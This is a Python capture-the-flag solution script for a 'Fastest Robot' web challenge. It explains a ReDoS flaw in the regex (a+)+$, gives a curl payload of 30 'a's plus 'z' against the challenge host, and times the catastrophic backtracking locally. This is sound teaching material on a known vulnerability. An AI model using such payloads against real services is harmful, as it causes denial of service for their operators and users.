#!/usr/bin/env python3
"""
Fastest Robot Web Challenge - SOLVED
ReDoS (Regular Expression Denial of Service) Attack

Author: Mutt (UK CyberTeam)
Challenge URL: https://cpp.bootupctf.net:8088/

SOLUTION SUMMARY:
================

Vulnerability: ReDoS in regex pattern (a+)+$
Attack: Catastrophic backtracking with payload 'a' * 30 + 'z'
Result: Bot gets stuck in regex processing > 2 seconds
Flag: [REDACTED]

TECHNICAL ANALYSIS:
==================

1. Race Condition Setup:
   - Bot gets 2-second head start to process /flag request
   - If bot finishes in < 2s: "robot wins"
   - If bot takes > 2s: bot process terminated, user gets flag

2. Vulnerable Code:
   ```python
   def visit_url_with_regex_check(url):
       # ... path extraction ...
       match = re.match("(a+)+$", path)  # VULNERABLE REGEX
   ```

3. ReDoS Exploit:
   - Pattern (a+)+$ is vulnerable to catastrophic backtracking
   - Input like "aaaaaaaaaaaaaaaaaaaaaa...z" causes exponential time
   - Server hangs on regex processing, exceeding 2-second timeout

4. Working Payload:
   - URL: /flag/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaz (30 a's + z)
   - Causes regex to take > 2 seconds
   - Bot process gets terminated
   - Flag is returned

WORKING EXPLOIT:
===============
curl "https://cpp.bootupctf.net:8088/flag/$(printf 'a%.0s' {1..30})z"

Response:
"My robot had a head start... and you still beat him??? Fine, here's the flag: <b>[REDACTED]</b>"
"""

import time

def demonstrate_redos():
    """Demonstrate the ReDoS vulnerability locally"""
    import re
    
    pattern = re.compile("(a+)+$")
    
    print("🔍 ReDoS Demonstration")
    print("Pattern: (a+)+$")
    print()
    
    # Show how processing time increases exponentially
    for length in [10, 15, 20, 25, 30]:
        payload = "a" * length + "z"  # Non-matching end triggers backtracking
        
        start = time.time()
        result = pattern.match(payload)
        elapsed = time.time() - start
        
        print(f"Length {length:2}: {elapsed:.4f}s - {'Match' if result else 'No match'}")
        
        if elapsed > 0.1:
            print(f"  ⚠️  Significant delay detected!")
        if elapsed > 2.0:
            print(f"  🎯 This would beat the 2-second timeout!")

def main():
    print("🤖 Fastest Robot Challenge - Solution")
    print("=" * 50)
    
    print("🎯 CHALLENGE SOLVED!")
    print("Flag: [REDACTED]")
    print()
    
    print("📝 Exploit Summary:")
    print("- Vulnerability: ReDoS in regex (a+)+$")
    print("- Attack: 30 'a' characters followed by 'z'")
    print("- Effect: Bot regex processing exceeds 2-second timeout")
    print("- Result: Bot terminated, flag returned")
    print()
    
    print("🧪 Local ReDoS demonstration:")
    demonstrate_redos()
    print()
    
    print("✅ Manual verification command:")
    print("curl 'https://cpp.bootupctf.net:8088/flag/$(printf \"a%.0s\" {1..30})z'")

if __name__ == "__main__":
    main()
